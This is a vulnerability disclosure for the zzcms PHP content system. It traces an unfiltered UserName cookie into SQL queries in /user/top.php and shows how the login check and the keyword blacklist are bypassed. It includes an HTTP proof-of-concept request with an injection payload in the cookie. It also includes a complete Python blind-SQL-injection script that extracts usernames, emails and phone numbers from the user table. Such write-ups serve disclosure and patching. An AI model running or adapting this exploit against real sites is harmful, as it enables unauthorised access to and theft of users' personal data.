# /user/top.php
First we can find sql operation in `/user/top.php`
```
function ShowUserSf(){
	if ($_COOKIE["UserName"]<>"" ){
		$sql="select groupname,grouppic from zzcms_usergroup where groupid=(select groupid from zzcms_user where username='".$_COOKIE["UserName"]."')";
        $rs=query($sql);
		$row=fetch_array($rs);
		$rownum=num_rows($rs);
		if ($rownum){
        $str= "<b>".$row["groupname"]."</b><img src='../".$row["grouppic"]."'> " ;
		}
 		   
		$sql="select groupid,totleRMB,startdate,enddate from zzcms_user where username='" .$_COOKIE["UserName"]. "'";
        $rs=query($sql);
		$row=fetch_array($rs);
		$rownum=num_rows($rs);
		if ($rownum){
			if ($row["groupid"]>1){
			$str=$str ."服务时间：".$row["startdate"]." 至 ".$row["enddate"];
			}elseif ($row["groupid"]==1){
			$str=$str . "<a href='../one/vipuser.php' target='_blank'>查看我的权限</a>";
			}
		}else{
			$str=$str . "用户不存在";
		}		
		
	}else{
	$str=$str. "您尚未登录";
	}
echo $str;			 
}
?>	
```

It seems vulnerable to boolean based blind sql injection since parameter `$_COOKIE["UserName"]` is not filterd

![]()

By finding usage, we can find `/user/ask.php` is one of pages who include `/user/top.php` 

```
<?php
include("top.php");
?>
...

}
```

In `/user/ask.php`
```
<?php
include("../inc/conn.php");
include("check.php");
?>
```

`check.php` is used to check whether visitor has logged in
```
<?php
if (!isset($_COOKIE["UserName"]) || !isset($_COOKIE["PassWord"])){
    echo "<script>location.href='/user/login.php';</script>";
}else{
    //verify username and password
}
?>
```
if the attacker submits cookies like `Cookie: UserName=foo`, without `PassWord`, only codes in `if` will be executed. However, codes in `if` merely echo javascript to html. As a result, the rest of codes in `ask.php` which use parameter `$_COOKIE["UserName"]` will still be executed.

In `/inc/conn.php`, we can find
```
include(zzcmsroot."/inc/stopsqlin.php");
```

and in `/inc/stopsqlin.php`
```
function stopsqlin($str){
if(!is_array($str)) {//有数组数据会传过来比如代理留言中的省份$_POST['province'][$i]
	$str=strtolower($str);//否则过过滤不全
	
	$sql_injdata = "";
	$sql_injdata= $sql_injdata."|".stopwords;
	$sql_injdata=CutFenGeXian($sql_injdata,"|");
	
    $sql_inj = explode("|",$sql_injdata);
	for ($i=0; $i< count($sql_inj);$i++){
		if (@strpos($str,$sql_inj[$i])!==false) {showmsg ("参数中含有非法字符 [".$sql_inj[$i]."] 系统不与处理");}
	}
}	
}
	
$r_url=strtolower($_SERVER["REQUEST_URI"]);
if (checksqlin=="Yes") {
if (strpos($r_url,"siteconfig.php")==0 && strpos($r_url,"label")==0 && strpos($r_url,"template.php")==0) {
foreach ($_GET as $get_key=>$get_var){ stopsqlin($get_var);} /* 过滤所有GET过来的变量 */      
foreach ($_POST as $post_key=>$post_var){ stopsqlin($post_var);	}/* 过滤所有POST过来的变量 */
foreach ($_COOKIE as $cookie_key=>$cookie_var){ stopsqlin($cookie_var);	}/* 过滤所有COOKIE过来的变量 */
foreach ($_REQUEST as $request_key=>$request_var){ stopsqlin($request_var);	}/* 过滤所有request过来的变量 */
}
}
?>
```
which means all parameters in `$_GET`, `$_POST`, `$_COOKIE`, `$_REQUEST` are filterd while blacklist--`stopwords` is defined in `/inc/config.php`

```
define('stopwords','select|update|and|or|delete|insert|truncate|char|into|iframe|script|得普利麻|易瑞沙|益赛普|赫赛汀|日达仙|百泌达|多吉美|拜科奇|赛美维|施多宁|派罗欣|妥塞敏|格列卫|特罗凯|手机窃听器|手枪') ;//网站禁用关键字
```

Although we can't use `select` and `or`, we can still query in the same table `zzcms_user`

![](https://raw.githubusercontent.com/Ling-Yizhou/zzcms-vuln/master/img/columns.png)

# POC
```
GET /user/ask.php HTTP/1.1
User-Agent: PostmanRuntime/7.25.0
Accept: */*
Cache-Control: no-cache
Postman-Token: 61080183-d3aa-4674-943d-dfb56440c9ac
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Connection: close
Cookie: UserName=' || '1'='1'#
```


![](https://raw.githubusercontent.com/Ling-Yizhou/zzcms-vuln/master/img/boolture.png)
![](https://raw.githubusercontent.com/Ling-Yizhou/zzcms-vuln/master/img/boolfalse.png)




# exp
```
import requests
import string

url = 'http://127.0.0.1/user/ask.php'
result = []


def get_column_by_id(uid, column):
    result = ''
    for x in range(50):
        flag = 1
        for i in string.ascii_letters + string.digits + '@.':
            cookies = {
                'UserName': f"' || {column} like '{result}{i}%' && id = {uid}#"
            }
            response = requests.get(url, cookies=cookies)
            # print(response.text)
            if "查看我的权限</a>)" in response.text:
                result += i
                break
            if i == '.':
                flag = 0

        if flag == 0:
            break

        print(f'[+] id: {uid}, {column}: ' + result)
    return result


for uid in range(1, 10):
    column_list = ['username','email','phone']
    tmp = [get_column_by_id(uid, i) for i in column_list]
    if '' not in tmp:
        result.append(tmp)

print(result)
```
Results
![](https://raw.githubusercontent.com/Ling-Yizhou/zzcms-vuln/master/img/sqli.png)
